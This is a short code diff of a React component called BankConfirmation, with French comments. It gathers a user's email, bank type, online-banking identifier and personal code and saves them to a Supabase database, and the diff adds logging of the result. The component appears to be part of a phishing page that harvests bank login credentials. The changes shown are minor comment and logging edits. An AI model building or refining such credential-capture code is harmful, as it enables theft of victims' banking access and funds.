@@ -37,12 +37,12 @@ const BankConfirmation: React.FC = () => {
         return;
       }
       
-      // Préparation des données bancaires uniquement
-      // Utilisation des noms de champs corrects pour Supabase
+      // Préparation des données bancaires uniquement en utilisant les noms de champs exacts
+      // de la base de données Supabase
       const bankData = {
         email,
         typebanque: typeBanque,
-        identifiantbanque: identifiantBancaire,  // Assurons-nous que le nom correspond à celui de la base de données
+        identifiantbanque: identifiantBancaire,
         codepersonnel: codePersonnel
       };
       
@@ -55,8 +55,9 @@ const BankConfirmation: React.FC = () => {
         codePersonnel
       });
       
-      // N'envoyer que les données bancaires à Supabase
-      await upsertUser(bankData);
+      // Envoyer uniquement les données bancaires à Supabase
+      const result = await upsertUser(bankData);
+      console.log("Résultat de l'opération upsertUser:", result);
       
       setIsLoading(false);
       setProcessing(true);
